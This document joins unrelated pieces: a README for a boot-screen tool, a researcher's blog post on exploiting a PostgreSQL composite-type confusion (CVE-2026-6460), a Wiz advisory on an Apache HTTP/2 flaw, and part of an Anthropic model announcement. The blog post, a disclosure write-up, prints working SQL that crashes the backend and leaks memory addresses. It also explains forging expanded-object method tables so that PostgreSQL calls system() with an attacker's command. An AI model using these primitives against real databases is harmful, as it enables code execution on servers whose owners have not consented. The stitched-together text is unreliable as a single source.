+01:00 README.md bootvine A live tree of service manager jobs on the console, for systemd and OpenRC , in the spirit of nix-output-monitor . It replaces the vertically scrolling kernel and service lines with the units still pending. In the room the tree leaves, a timeline is displayed of the slowest ones that ran. I started bootvine out of frustration with the boot screen of most Linux distributions: a wall of log lines scrolling past too fast to read. Under systemd it follows the boot, a resume from hibernation and the shutdown. Under OpenRC, only boot is supported. It answers passphrase prompts such as a LUKS unlock and shows why a unit failed. The guide lists what each service manager covers and walks through each part of the screen. Requirements systemd ≥ 246 as PID 1, or OpenRC (built with --features openrc ) a virtual terminal a systemd initrd, to show the boot from the initrd as well as stage 2 See Install for each distribution. Try it without installing With Nix , boot a sample NixOS machine with slow and failing units in a QEMU window, without touching your system's boot: nix run git+https://codeberg.org/wvhulle/bootvine#sample-vm-slow-services It logs in as root; poweroff shows the shutdown. The guide lists the other sample machines and the scripted demos that play in a terminal. Documentation Guide to the screen: the tree, the timeline, failures, shutdown and passphrase prompts. Install on NixOS, from source on any systemd distribution, and on OpenRC. Configuration of colours, timing and the console. Architecture : how bootvine follows the boot and takes the console. title: Turning a 22-year-old Postgres type-confusion primitive into RCE
body_text: Part 3/6 | How I Ended Up Turning a 22-Year-Old PostgreSQL Type-Confusion Primitive into RCE (CVE-2026-6460) - Mehmet Ince @mdisec - Vulnerability Researcher | Building security products | Security Advisor | Amateur Muay Thai fighter Skip to content Posts CVE INDEX About Me X LinkedIn YouTube GitHub Part 3/6 | How I Ended Up Turning a 22-Year-Old PostgreSQL Type-Confusion Primitive into RCE (CVE-2026-6460) Nov 9, 2026 If you had told me in April 2026 one question “Mehmet, can we use managed PostgreSQL for this project?” would send me into the deepest rabbit hole of my life, I would have laughed. Months later, I finally found the bottom of that rabbit hole. It was a 22-year-old zero-day in PostgreSQL core. In this blog post you will read a story of how I ended up uncovering a new class of type-confusion vulnerabilities in PostgreSQL. This is the 3rd part of blog post series named “ Systemic Risks in the Managed PostgreSQL Industry ”. For those who have missed the first two part, feel free to start from 1st and 2nd which will give you a complete context of this madness. TLDR: I gave PostgreSQL a value inside a composite type, changed the type of one of its fields, and asked it to read the value back. That type confusion led to one of the most reliable memory-corruption exploit I have seen. But I did not start by looking for a PostgreSQL core vulnerability. I was exploiting pg_clickhouse, and getting that exploit to work left me with a question about how PostgreSQL understands its own data. With an AI agent as my teacher, I worked through the internals one question at a time. Then a seemingly unrelated conversation gave me the idea that connected it all, and eventually I found myself staring at a primitive that had been there for for awhile. This is the full true story of how those pieces came together, I am sure you will enjoy this story. Beginning of August 2026 During June and July, I had been exploiting memory-corruption vulnerabilities across several PostgreSQL extensions. One of the extensions that I achieved code execution was pg_clickhouse . That case study has its own story, which I will share in the future. What matters here is what that exploit forced me to learn. pg_clickhouse translates ClickHouse values into native PostgreSQL values. A ClickHouse Array is not a PostgreSQL array, right ? So the extension had to rebuild its elements as Datum values in the format that PostgreSQL expected. A mistake in that conversion was what eventually gave me a code execution. This was my first time meeting with things like Datum , OIDs etc in the PostgreSQL universe. I learned only enough to finish the exploit, but one question remained in the back of my mind: How does PostgreSQL itself decide what a value is? And how does it process and represent it? Somewhere around late July, I finally got my head out of the extensions and just followed that question into PostgreSQL core. Disclaimer: I reported pg_clickhouse oob write + read chain to the vendor and they fixed it at Jun 23.  PostgreSQL Types 101 I started learning with a very simple query. What happens when I run the simplest query SELECT 1337? While I avoided all the black magic in Postgres internals, I kept this crash course on the basics of data types. I start with this query. SET debug_print_parse = on; SELECT 1337; SET debug_print_parse = on ; SELECT 1337 ; The database scanner looks at the query, recognises SELECT as a keyword, and 1337 as an integer token. Then it creates a parse tree for the query. Next, PostgreSQL walks the tree and transforms it into a typed query tree. {QUERY :commandType 1 :targetList ( {TARGETENTRY :expr {CONST :consttype 23 :consttypmod -1 :constlen 4 :constbyval true :constisnull false :location 7 :constvalue 4 [ 57 5 0 0 0 0 0 0 ] } } ) } { QUERY : commandType 1 :targetList ( { TARGETENTRY : expr { CONST : consttype 23 :consttypmod -1 :constlen 4 :constbyval true :constisnull false :location 7 :constvalue 4 [ 57 5 0 0 0 0 0 0 ] } } ) } Parse tree looks like above. But I just wanted to better understand things like what is the consttype 23 ? why constvalue has [ 57 5 0 0 0 0 0 0 ]  and where is my 1337 value ? At this point, I asked Opus 5 to prepare me a full deep-dive course on PostgreSQL types.  Spending a few days around there and talking with my agent, whom I named pg_expert taught me these: consttype = 23 → int4 constlen = 4 → four-byte payload constbyval = true → stored by value constisnull = false → this is not NULL consttype = 23 → int4 constlen = 4 → four - byte payload constbyval = true → stored by value constisnull = false → this is not NULL constvalue 4 [ 57 5 0 0 0 0 0 0 ] can be converted to hexadecimal, making the value easier to recognize: 57 decimal = 0x39 5 decimal = 0x05 57 decimal = 0x39 5 decimal = 0x05 On my little-endian system, the bytes were stored least-significant first: 39 05 00 00 → 0x00000539 → 1337 39 05 00 00 → 0x00000539 → 1337 So 1337 had not disappeared.  But why do we even have 8 bytes [ 57 5 0 0 0 0 0 0 ] instead of simply 4 bytes ? That was because constvalue was not declared as an int32 . It was declared as a Datum , which was 8 bytes Our value 1337::int4 value stored at the lower four bytes of that generic carrier. How can that same 8-byte Datum represent a text , an array , or custom types ? A Datum Does Not Know What It Is Chatting with my pg_expert agent taught me more. A Datum does NOT know what it represents. The eight bytes carrying 1337 did not contain a hidden label saying “I am an integer.”. PostgreSQL knew its type only because of this consttype = 23 . That number is an OID (Object IDentifiers) pointing to a row in the pg_type system catalog SELECT oid, typname, typlen, typbyval, typalign, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid = 23; oid | typname | typlen | typbyval | typalign | typinput | typoutput -----+---------+--------+----------+----------+----------+----------- 23 | int4 | 4 | t | i | int4in | int4out SELECT oid, typname, typlen, typbyval, typalign, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid = 23 ; oid | typname | typlen | typbyval | typalign | typinput | typoutput -----+---------+--------+----------+----------+----------+----------- 23 | int4 | 4 | t | i | int4in | int4out That means the pg_type row shows what the value means and how PostgreSQL will use it. So far, it’s brilliant and easy to understand. But what about the text type ? SELECT oid, typname, typlen, typbyval, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid IN ('int4'::regtype, 'text'::regtype) // <== HERE FILTERIN THE INT4 and TEXT only ORDER BY oid; typname | typlen | typbyval | typinput | typoutput ---------+--------+----------+----------+----------- int4 | 4 | true | int4in | int4out text | -1 | false | textin | textout SELECT oid, typname, typlen, typbyval, typinput::regproc, typoutput::regproc FROM pg_type WHERE oid IN ( 'int4' ::regtype, 'text' ::regtype) // <== HERE FILTERIN THE INT4 and TEXT only ORDER BY oid; typname | typlen | typbyval | typinput | typoutput ---------+--------+----------+----------+----------- int4 | 4 | true | int4in | int4out text | - 1 | false | textin | textout For text, typlen = -1 means that the representation have a variable length. And typbyval = false means that the Datum carried a pointer. Datum ──> pointer ──> variable-length text representation Datum ── > pointer ── > variable - length text representation So the same 8-byte value stores a memory address for the text. Datum can pass the value either by value itself or by reference to it. Nice, I love the elegant abstraction Datums provides! Unknown is a type! So far everything makes sense, but I wanted to better understand the   typinput and typoutput columns too. These functions convert the value provided by the query into a native Datum or vice versa. So I ran this again. SELECT 1337, pg_typeof(1337), pg_column_size(1337); ?column? | pg_typeof | pg_column_size ----------+-----------+---------------- 1337 | integer | 4 SELECT 1337 , pg_typeof( 1337 ), pg_column_size( 1337 ); ? column ? | pg_typeof | pg_column_size ----------+-----------+---------------- 1337 | integer | 4 But then I added quotation marks to see if PostgreSQL has dynamic type casting/recognition or something: SELECT pg_typeof('1337'); pg_typeof ----------- unknown SELECT pg_typeof( '1337' ); pg_typeof ----------- unknown I was a bit confused at this moment. I initially thought unknown meant “PostgreSQL does not know the type.” So I went back to chatting with my pg_expert agent, who is teaching me everything so far. I learned that unknown is an actual PostgreSQL type with OID 705 , used for string literals whose final type hasn’t been decided yet! Again, this makes super sense because PostgreSQL deliberately assigns untyped string literals this temporary type because the same text could eventually become many different things! SELECT '1337'::int4; SELECT '1337' ::int4; For example, the query supplies the target type int4. PostgreSQL looked up the typinput function for int4 and called int4in() and when its need to be printer it use int4out() PostgreSQL converts the unknown literal ‘1337’ through int4in() into a Datum, then returns text through int4out(). Critical Thinking: Wait a Minute! The Type Chooses the Code Up until this point, typinput and typoutput looked like ordinary conversion mechanism to me. pg_type contained many different native functions for many different types. While learning more about these functions, one detail stayed with me. An output function did not inspect a Datum and discover its type. It simply trusted all the values and flags around the Datum. int4out() extracted an integer because PostgreSQL had already selected it as the output function for int4 . A different output function could interpret the same generic carrier according to completely different rules. I still remember that, at that very moment, I was actually thinking about the TOCTOU Vulnerabilities class of the web apps I have been exploiting/fixing for years and years. “What if I could somehow change the type between the moment PostgreSQL constructed a value and the moment it used that value?” If I can do this, we might be able to force PostgreSQL to process a Datum created for a completely different type as if it were the type the function expects. Having a type confusion in PostgreSQL can actually give me an opportunity to abuse all the other functions in PostgreSQL internals. So I went back to learning more about what I can use to force PostgreSQL to natively call different types’ output functions for my int4 value. It turns out that the LANGUAGE internal feature can be used for that purpose. LANGUAGE internal:  Type Confusion I Could Create on Purpose The LANGUAGE internal allows a superuser to create an SQL function pointing to native code already compiled into PostgreSQL. I created the following one. CREATE FUNCTION pg_temp.confused_textout(integer) RETURNS cstring AS 'textout' LANGUAGE internal STRICT; CREATE FUNCTION pg_temp .confused_textout( integer ) RETURNS cstring AS 'textout' LANGUAGE internal STRICT; Then I gave it the same int4 value. and my local-backend crashed! SELECT pg_temp.confused_textout(1337); server closed the connection unexpectedly This probably means the server terminated abnormally before or while processing the request. SELECT pg_temp.confused_textout( 1337 ); server closed the connection unexpectedly This probably means the server terminated abnormally before or while processing the request. I’m pretty sure the PostgreSQL experts reading this wouldn’t be surprised by this crash, but it surprised me a lot! It sent me in a completely different direction. I built a working exploit using this type-confusion feature to exploit LANGUAGE internal against security extensions deployed by managed PostgreSQL providers. That research eventually became a part of the Part 2 story. For a while, I moved on and left this type-confusion question behind. Roughly two weeks later, something completely unrelated brought me back to it. Detour: Tomatoes and SQL Injection Let me take a small detour. This Postgres article series is all about telling you my story in the end, isnt it ? I do not remember the exact date, but during one of our runs or walks, my partner Bilge (Staff Machine Learning Engineer at EDB) and I were discussing second-order SQL injection in the PostgreSQL AI extensions and the possibility of tricking AI features of these extensions to hallucinate and produce malicious SQL queries. That conversation led to chatting about prepared statements . I first learned about SQL injection around 2005, and God knows how many times I have exploited it since. Twenty years later, most libraries and frameworks still rely heavily on string escaping to generate secure SQL queries, even though RDBMSs have a beautiful feature named prepared statements. I studied them when I was a uni student, mostly to see what could still be exploited even if the target app uses prepared statements. Things like triggering excessive SQL cold parsing and stuff like that. But more importantly, for years I taught SQL Injection to thousands of my trainees with this concept: “Knowledge is knowing a tomato is a fruit; wisdom is not putting it in a fruit salad.” – Miles Kington In my version, the SQL query is the recipe and the values are the ingredients. Prepared statements let the database understand the recipe first, then receive the ingredients separately. So even a value like ' OR 1=1 -- may look evil, but it remains data and never gets the chance to rewrite the query. I had always seen this separation as a security feature. But this time, I noticed something in the middle of the convo with Bilge. Databases can finish all the parsing first and wait for me to execute it. Before execution, I can run whatever query I want. I can alter types before executing the query! Uncovering 22-Year-Old PostgreSQL Type-Confusion Primitive So the idea is simple; I could prepare a query, change something, and execute it later. But change what? PostgreSQL is not gonna let me redefine what the built-in types int4 , text , or UUID mean. I was not thinking about composite types at this point. Honestly, I barely knew what they were. I asked Claude agent pg_expert a much simpler question: Which PostgreSQL types can I create, use inside a prepared query, and then alter it before running execute ? That question led me to composite types. In PostgreSQL, a composite type represents the structure of a row. It is essentially a custom, user-defined data type that acts as a container for multiple fields, each with its own name and data type. [ 1 , 2 ] CREATE TYPE pg_temp.poc AS ( key uuid ); CREATE TYPE pg_temp .poc AS ( key uuid ); It had its own type OID, but its attributes defined the current row layout. I can change the attribute a type from UUID to another type without replacing the composite type itself. The Crash I created a one-field composite where the attribute started as UUID. Then I prepared a query, changed that attribute to bytea, and executed the prepared statement. CREATE TYPE pg_temp.poc AS (key uuid); PREPARE pc_crash AS SELECT '(01020000-0000-0000-0000-000000000000)' ::pg_temp.poc; ALTER TYPE pg_temp.poc ALTER ATTRIBUTE key TYPE bytea CASCADE; EXECUTE pc_crash; CREATE TYPE pg_temp .poc AS ( key uuid); PREPARE pc_crash AS SELECT '(01020000-0000-0000-0000-000000000000)' :: pg_temp . poc ; ALTER TYPE pg_temp . poc ALTER ATTRIBUTE key TYPE bytea CASCADE; EXECUTE pc_crash; And the result was a segfault! client backend was terminated by signal 11: Segmentation fault DETAIL: Failed process was running: EXECUTE pc_crash; client backend was terminated by signal 11 : Segmentation fault DETAIL: Failed process was running: EXECUTE pc_crash; I knew I had found exactly the kind of type confusion I had been looking for! I knew this was no longer a superuser-only LANGUAGE internal behaviour I had exploited before. I knew that I could trigger this crash as a lowest-privileged login role on any PostgreSQL instance. Probably all the Postgres-compatible offerings too (more about this later) Last but not least, I already knew that controlled UUID bytes reaching the wrong native consumer, bytea in my case, had serious exploitation potential. These two have the most reliable exploit primitive I have seen in the PostgreSQL exploits. Before diving into the Hacking PostgreSQL internals, we need to learn a few things about PostgreSQL to better understand the rest of the article! Quick Course: What is BYTEA ? bytea is PostgreSQL’s data type for storing arbitrary binary data. Internally, it uses a variable-length representation called varlena . PostgreSQL places a small header before the bytes to describe their size and storage format. Basic concepts of bytea +----------------------+------------------------+ | 4-byte header | binary payload | +----------------------+------------------------+ Basic concepts of bytea +----------------------+------------------------+ | 4 -byte header | binary payload | +----------------------+------------------------+ The header tells PostgreSQL which representation it is looking at and how large the complete value is. We do not need to understand every varlena representation. For the rest of this article, we only need to know two things Inline representation → the leading bytes can control the claimed length External expanded representation → the leading bytes can introduce an internal object pointer Inline representation → the leading bytes can control the claimed length External expanded representation → the leading bytes can introduce an internal object pointer For example, a normal inline example of the five ASCII characters hello . That 24 can be decoded as 0x24 >> 2 which is 9. So 4-byte header + 5-byte payload = 9 bytes! +----------------------+------------------+ | 24 00 00 00 | 68 65 6c 6c 6f | | 4-byte header | "hello" | +----------------------+------------------+ + ----------------------+------------------+ | 24 00 00 00 | 68 65 6c 6c 6f | | 4 - byte header | "hello" | + ----------------------+------------------+ The most important example, external representation, when header starts with 01 PostgreSQL believes the value is not stored inline at all. Instead, it treats the bytes as a reference to an expanded object somewhere in memory. +------------------+---------------------+----------------------------------+ | 01 | 02 | 88 77 66 55 44 33 22 11 | | external marker | expanded-object tag | ExpandedObjectHeader * pointer | +------------------+---------------------+----------------------------------+ + ------------------+---------------------+----------------------------------+ | 01 | 02 | 88 77 66 55 44 33 22 11 | | external marker | expanded - object tag | ExpandedObjectHeader * pointer | + ------------------+---------------------+----------------------------------+ So the following data after the header is just object reference pointer instead of the data itself. Crash and Root Cause Analysis Lets get back to where we were. The UUID I supplied contained exactly sixteen bytes, starting with 01 and 02 . While attribute a was still UUID, there was nothing special about 01 02 or the fourteen zero bytes following it. They were simply controlled UUID data. ALTER TYPE changed the current definition of attribute key from uuid to bytea , but it did not convert or rewrite the binary value already stored by the prepared query. During EXECUTE , PostgreSQL still had exactly the same bytes. When we EXECUTE the query, PostgreSQL need to return the value of our type pg_temp.poc, in order to do that, it calls the composite output function, record_out(). So record_out() looks at the  pg_temp.poc’s attribute key and says ‘That is bytea’ and selects byteaout() But the data   byteaout()  takes is our old UUID bytes that we can control. This is where the type confusion happens! byteaout() interprets 01 02 as an external expanded-object header and the following eight zero bytes as a NULL object pointer. All of these means, we can literally create any varlena representation we want by fully controlling the headers and following 12 byte! PostgreSQL thinks it needs to reach the ExpandedObjectHeader but its address is 00000000 because thats what we have written inside the UUID, therefore local-backend crash. Before byteaout() could print the value, it first needed to convert this external representation into something it can print. I learned that PostgreSQL calls this process detoasting . When we run EXECUTE pc_crash , the call path is as follows. The relevant path looked like this EXECUTE pc_crash ├─ record_out() a: bytea ├─ byteaout() fetch + detoast ├─ detoast_external_attr() 01 02 → expanded ├─ DatumGetEOHP() eohptr = NULL ├─ EOH_get_flat_size(NULL) └─ NULL->eoh_methods SIGSEGV EXECUTE pc_crash ├─ record_out() a: bytea ├─ byteaout() fetch + detoast ├─ detoast_external_attr() 01 02 → expanded ├─ DatumGetEOHP() eohptr = NULL ├─ EOH_get_flat_size( NULL ) └─ NULL -> eoh_methods SIGSEGV PostgreSQL then passed the NULL pointer to EOH_get_flat_size() . The important line inside that function was effectively: return eohptr->eoh_methods->get_flat_size(eohptr); return eohptr -> eoh_methods -> get_flat_size (eohptr); eohptr is what we influence and we choose 00000000 in our POC, which is a NULL. Therefore PostgreSQL crashed while trying to read its eoh_methods pointer because it believed it had received a valid external expanded object and followed the normal code path to process it. The exploitation idea: replacing NULL with our fake object that could make PostgreSQL follow to our own choosen methods! Hijacking control-flow via Fake ExpandedObjects contains Native Function Pointers ExpandedObjectMethods contains two native function pointers typedef struct ExpandedObjectMethods { EOM_get_flat_size_method get_flat_size; EOM_flatten_into_method flatten_into; } ExpandedObjectMethods; typedef struct ExpandedObjectMethods { EOM_get_flat_size_method get_flat_size; EOM_flatten_into_method flatten_into; } ExpandedObjectMethods ; Normal code uses those methods like this to convert an expanded object into its flat representation whenever it’s needed. EOH_get_flat_size(ExpandedObjectHeader *eohptr) { return eohptr->eoh_methods->get_flat_size(eohptr); } EOH_flatten_into(ExpandedObjectHeader *eohptr, void *result, Size allocated_size) { eohptr->eoh_methods->flatten_into(eohptr, result, allocated_size); } EOH_get_flat_size (ExpandedObjectHeader * eohptr) { return eohptr->eoh_methods-> get_flat_size (eohptr); } EOH_flatten_into (ExpandedObjectHeader * eohptr, void * result, Size allocated_size) { eohptr->eoh_methods-> flatten_into (eohptr, result, allocated_size); } This is not normally an attacker-controlled callback interface. These are trusted internal representations created by PostgreSQL. The output functions can assume the pointer, header, and methods table are not malicious. These are indirect native function calls. PostgreSQL obtains the function addresses from the object’s methods table and then calls them. That is something we can actually use to change the control-flow path. Before going further, I needed a simple model for the objects involved. I named the two fake objects according to what they represented H = fake ExpandedObjectHeader M = fake ExpandedObjectMethods table H = fake ExpandedObjectHeader M = fake ExpandedObjectMethods table So our plan is that the UUID pointed to H , H pointed to M , and M contained the native function addresses that we wanna cal. A forged expanded object redirects PostgreSQL’s methods lookup, turning the normal detoasting path into a call to system(H). Calling system($payload) The important detail is that PostgreSQL used H twice. Lets remember the actual C code eohptr->eoh_methods->get_flat_size(eohptr) │ │ │ │ │ │ │ └── argument = H │ │ └───────────── function = system@plt │ └──────────────────────────── methods table = M └─────────────────────────────────────── object = H eohptr -> eoh_methods -> get_flat_size (eohptr) │ │ │ │ │ │ │ └── argument = H │ │ └───────────── function = system@plt │ └──────────────────────────── methods table = M └─────────────────────────────────────── object = H First, it treated H as an ExpandedObjectHeader and read the eoh_methods pointer at offset +0x08 . That pointer led to M , where we had placed the address of system() . PostgreSQL then called the selected method and passed the original object pointer, H , as its first argument. In other words, H helped PostgreSQL find system() , and then the same H was handed to system() as its parameter. Fortunately, the first eight bytes of H came before the eoh_methods pointer. I could place the NULL-terminated command id>x in those bytes while keeping the address of M at offset +0x08 . Leaking Memory Addresses and defeating the ASLR with the same primitive As I have heavily talked about exploiting extensions vulnerabilities on managed-Postgres providers at Part 1 , we dont get to read /proc/self/mem due to hardening. Our exploitation plan is very clear but the challenge is we need to leak addresses of these objects. I started to chatting with my pg_expert to find more about PostgreSQL operation that could return a pointer-valued data while SQL expected an ordinary integer. The moment I prompted the agent, it went to “Oh actually we have talk about this during pg_clickhouse exploit back in July. Do you remember the ClickHouse Array is not a PostgreSQL Array ?” – my beloved teacher pg_expert agent It was a twist of fate. I had ended up exactly where the original idea had started. PostgreSQL Arrays store their element type inside their binary representation. unnest() trusts that internal type when deciding how to extract each element. Normally, everything agrees: SELECT x FROM unnest(ARRAY['hello']::text[]) AS item(x); SELECT x FROM unnest( ARRAY ['hello']:: text []) AS item(x); The array says its element is text , so unnest() returns a pointer-valued text Datum and SQL processes it as text. But what if the array internally says text , while the surrounding SQL contract says bigint ? Because text is passed by reference, unnest() returns a Datum containing the memory address of the text value! But the surrounding SQL expression expects a by-value bigint , so PostgreSQL prints those same pointer bits as an integer. In other to say this, we can exploit exactly same type confusion vulnerability to alter the arrays’ text element type to bigint so that unnest() will return the memory address instead of the value! aka leaking memory address! Creating a PostgreSQL Array data structures with UUID The smallest PostgreSQL Array needs 48 bytes. A single UUID gives a 16 controlled bytes. So we can simply combine 3 UUIDs next to each other to build exactly 48 byte fully controlled data structer! Three UUID fields provide 48 controlled bytes: 24 for array metadata, 4 for the text header, 16 for the payload, and 4 filler bytes. The animation above shows how three UUIDs become one 48-byte array carrier. I prepare those bytes while all three attributes are still UUIDs. From there, I exploit the same type confusion for only the first UUID a to bigint[] ! So unnest() extracts the element as text and returns its pointer, while SQL expects a bigint and exposes that pointer as a memory address. The final +4 skips the text header and lands on my controlled payload. CREATE TYPE pg_temp.address_carrier AS ( a uuid, b uuid, c uuid ); CREATE FUNCTION pg_temp.leak_address( r pg_temp.address_carrier ) RETURNS bigint LANGUAGE plpgsql AS $$ DECLARE pointer bigint; BEGIN SELECT x INTO pointer FROM unnest(r.a) AS item(x) LIMIT 1; RETURN pointer + 4; END $$; PREPARE address_leak AS SELECT to_hex(pg_temp.leak_address( '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)'::pg_temp.address_carrier )); ALTER TYPE pg_temp.address_carrier ALTER ATTRIBUTE a TYPE bigint[] CASCADE; EXECUTE address_leak; to_hex -------------- 55f2a589ae0c (1 row) CREATE TYPE pg_temp .address_carrier AS ( a uuid, b uuid, c uuid ); CREATE FUNCTION pg_temp .leak_address( r pg_temp . address_carrier ) RETURNS bigint LANGUAGE plpgsql AS $$ DECLARE pointer bigint ; BEGIN SELECT x INTO pointer FROM unnest( r . a ) AS item(x) LIMIT 1 ; RETURN pointer + 4 ; END $$; PREPARE address_leak AS SELECT to_hex( pg_temp . leak_address ( '(c0000000-0100-0000-0000-000019000000,01000000-0100-0000-5000-000011223344,55667788-99aa-bbcc-ddee-ff0000000000)' :: pg_temp . address_carrier )); ALTER TYPE pg_temp . address_carrier ALTER ATTRIBUTE a TYPE bigint [] CASCADE; EXECUTE address_leak; to_hex -------------- 55f2a589ae0c ( 1 row ) A direct text to bigint confusion would only reinterpret the old text bytes as an integer. The array was important because it forced PostgreSQL to first produce a real pointer and then expose those same pointer bits as a bigint . POC Videos Full working exploit on PostgreSQL 18.6 CVE-2026-6460 Umbrella Fix and Variant Analysis of 21 more cases Once I have reached that point, I started thinking about different scenarios of where we can alter the attribute types before execution. All the other possible ways of keeping the old value alive. I found the same underlying mistake around RowExpr , JSON conversion caches and different places. I reported 21 cases in total. 9 November 2026 The PostgreSQL security commits landed as part of a much larger release containing 52 new CVE. 6 of those 52 CVEs are directly connected to this article. CVE-2026-6460 is the main umbrella fix for type confusion. It introduces composite attribute versioning, CVE-2026-120142 anonymous RECORD descriptors. CVE-2026-120148 backend-local anonymous-RECORD typmod CVE-2026-116329 statistics import could publish values under an obsolete type CVE-2026-116306 prevents ExecEvalFieldStore[De]Form from using a mismatched CVE-2026-120139 integer overflow in tuple-size calculation Coordinating this with managed-PostgreSQL Providers The reason why I have fallen into that rabbit hole 5 months ago was because I needed to better understand the how managed-database industry works before making a decision because at the end of the day, we all can outsource the infrastructure but we can not outsource the risk. When the vulnerability belongs to PostgreSQL core, how does the industry coordinate to protect its own customers? So I ported the my locally working exploit to almost every managed PostgreSQL platform I know and privately shared reproducible PoCs with their security teams. I haven’t seen any vendor who is not affected by this vulnerability! including those who has Postgres compatible offering. Databricks security team engineers validated all the exploits immediately. Thanks to Aaron and his team. Google escalated the AlloyDB reports to its highest priority P0. I am genuinely grateful of all the support from Google Cloud VRP team since day one! SupaBase team received the full details around mid August. Thanks to endless support from the Etienne since I first contacted him. Ubicloud members reached out to me after my part 1 article published and then they introduced me with the ClickHouse team. Both parties are also read in somewhere at end of August. AWS Aurora/RDS and Microsoft Azure PostgreSQL teams received the reports and working PoC at mid August. But what I respected the most is that some vendors brought their most senior engineering members to start implementing their own mitigation. They did not want to leave customers exposed while waiting for the upstream release cycle. So yeah my whole August was like that. Closing: Thank you PostgreSQL Communities and Core Security Team I spent 20 years of my life around security communities around the globe. But I really need to say that the support, positive approach and the respect I have seen my time at PGCONF.eu this year was quite suprized me. Have no idea PostgreSQL community at europe has such a family kind vibe. After my talk “Nobody Gets to Be Superuser (Until I Broke In)” at PGCONF.eu last month Valencia, I have received amazing support from everyone, specially the respected members of the community who are effortlessly fixing these vulnerabilities whenever someone sends an email to the securit@ address. I owe so much of where I am today to open source. I’ve spent my life learning by hacking things, understanding how they work, and making them more secure. Being able to contribute to PostgreSQL and its ecosystem in my own way means a lot to me. Seeing those contributions so warmly welcomed means even more. My talk this year was not recorded upon my request, but I receive a lot of invitation from different countries for their local PostgreSQL meetups. If you’d like to hear the whole story, I’ll be presenting the 90 minutes edition of it at the Prague PostgreSQL Meetup on Monday, 30 November. Come join me. I PROMISE IT’LL BE WORTH IT! https://cloomba.com/e/prague-postgresql-meetup-8-2026-11-30 ( If you’ve made it this far, I’d love to hear your thoughts! Feel free to leave a comment or ask me anything. ) Appendix: Dating the Primitive and the Duplicate Fiesta The mutable-row-type primitive dates to commit 077db40fa1f3 , introduced on May 5, 2004 with ALTER TABLE ... ALTER COLUMN ... TYPE . The exploitation technique I used relies on commit 1dc5ebc9077a , introduced on May 14, 2015, which added expanded-object pointers and their native method callbacks. Later than many other primitives I discovered during exploiting 20+ variants. I am not claiming that CVE-2026-6460 is exclusively “my vulnerability.” PostgreSQL treated it as an umbrella issue covering a much wider family of composite-type problems. Its commit credits many researchers whose reports may have involved overlapping discoveries, separate variants, or completely different journeys into the same systemic weakness. That is the reality of vulnerability research in the age of AI. This article only tells the story of how I reached it without any cyber enabled models back in August 2026. title: Critical RCE Vulnerability in Apache HTTP Server
body_text: Critical RCE Vulnerability in Apache HTTP Server: Everything You Need To Know | Wiz Blog Wiz Platform Solutions Pricing Resources Customers Company Sign in Under attack? Get a demo Blog Critical RCE Vulnerability in Apache HTTP Server: Everything You Need To Know Detect and mitigate CVE-2026-119618, a critical RCE vulnerability in Apache HTTP Server. According to Wiz data, 64% of cloud environments have resources vulnerable to CVE-2026-119618. Immediate patching is advised. Merav Bar November 11, 2026 | A critical synchronization vulnerability (CVE-2026-119618) has been identified in Apache HTTP Server’s HTTP/2 module (mod_http2). The flaw stems from a concurrent execution race condition within the assign_headers() function when handling shared resources. If successfully exploited, a remote, unauthenticated attacker can corrupt heap memory to achieve arbitrary code execution (RCE). As of the time of this blog’s publication, no exploit is available and there are no reports of exploitation in the wild. What is CVE-2026-119618? CVE-2026-119618 is a critical, high-severity vulnerability involving a race condition in the Apache HTTP Server, which was independently discovered by Anthropic and Google Cloud’s Vulnerability Research Team. Specifically, the flaw exists within the assign_headers() function of the HTTP/2 module (mod_http2). Due to improper synchronization when executing concurrent threads sharing resources, an attacker can trigger heap corruption. This memory corruption can ultimately be leveraged to achieve RCE on the hosting server, allowing unauthorized threat actors to execute arbitrary commands with the privileges of the web server process. Wiz Research data: what’s the risk to cloud environments? In cloud environments, a compromised Apache instance running containerized or virtualized workloads can serve as an entry point for lateral movement, potentially exposing adjacent microservices or cloud metadata endpoints. According to Wiz data 64% of cloud environments have resources vulnerable to CVE-2026-119618, and 51% of cloud environments have publicly exposed instances. Note that this does not take configuration into account. Which products are affected? The vulnerability affects deployments utilizing HTTP/2 capabilities on the Apache HTTP Server within the version ranges outlined in the table below: Vendor Product Affected Versions Patched Versions Apache Software Foundation Apache HTTP Server From 2.4.55 through 2.4.70 2.4.71 and newer GitHub (Open Source) mod_h2 module From 2.0.8 through 2.0.42 2.0.42 and newer Which actions should security teams take? Security operations and engineering teams should execute the following remediation and mitigation steps: 1. Upgrade Deployments Upgrade Apache HTTP Server: Update affected installations to Apache HTTP Server version 2.4.71 or later. This release addresses the race condition in assign_headers() . Update Standalone Modules: If managing standalone mod_h2 builds from GitHub, upgrade the module to a version newer than 2.0.42 . 2. Implement Temporary Mitigations If immediate patching is not possible due to operational constraints, temporarily disable HTTP/2 support to eliminate the attack vector. Edit the configuration file (such as httpd.conf ) to restrict active protocols to HTTP/1.1 by removing h2 and h2c references: # Restrict protocols to HTTP/1.1 Protocols http/1.1 Wiz customers can use the pre-built query and advisory in the Wiz Threat Center to search for vulnerable instances in their environment. title: Claude Fable 5.2 and Mythos 5.2
body_text: Introducing Claude Fable 5.2 and Claude Mythos 5.2 \ Anthropic Skip to main content News Research Policy Commitments Company Try Claude Introduction Performance and efficiency Coding Cybersecurity Science and engineering Safety and alignment Data privacy Availability November 9, 2026 Claude Fable 5.2 and Mythos 5.2 [1] Introduction [2] Performance and efficiency [3] Science and engineering [4] Safety and alignment [5] Availability We’ve upgraded Claude Fable and Claude Mythos—models that are designed to tackle the most daunting technical challenges. Claude Fable 5.2 and Claude Mythos 5.2 show improvements in areas like coding, reasoning, and vision. During prerelease testing they’ve helped our engineers complete otherwise-infeasible software migrations, designed three working electronic devices from scratch, solved two open problems in the physics of black holes, made substantial progress on robotics evaluations, and formalized the proof of Fermat’s Last Theorem in 30 hours—among many other applications we’ll discuss below. Claude Fable and Claude Mythos are the same underlying model. Fable has strong cybersecurity and biology safeguards to guard against misuse, which allows us to make it available to all users. Organizations pursuing beneficial applications in cybersecurity or biomedical research can apply for access to Mythos through our recently expanded Life Sciences and Cyber Verification Programs. Testers have found that Fable 5.2 and Mythos 5.2 communicate more clearly than past Fable and Mythos models. They generate outputs up to 30% faster than Claude Fable 5.1 and Claude Mythos 5.1, and they’re available at a lower price: $8 per million input tokens and $40 per million output tokens. Fable 5.2 and Mythos 5.2 also come with an optional fast mode, which 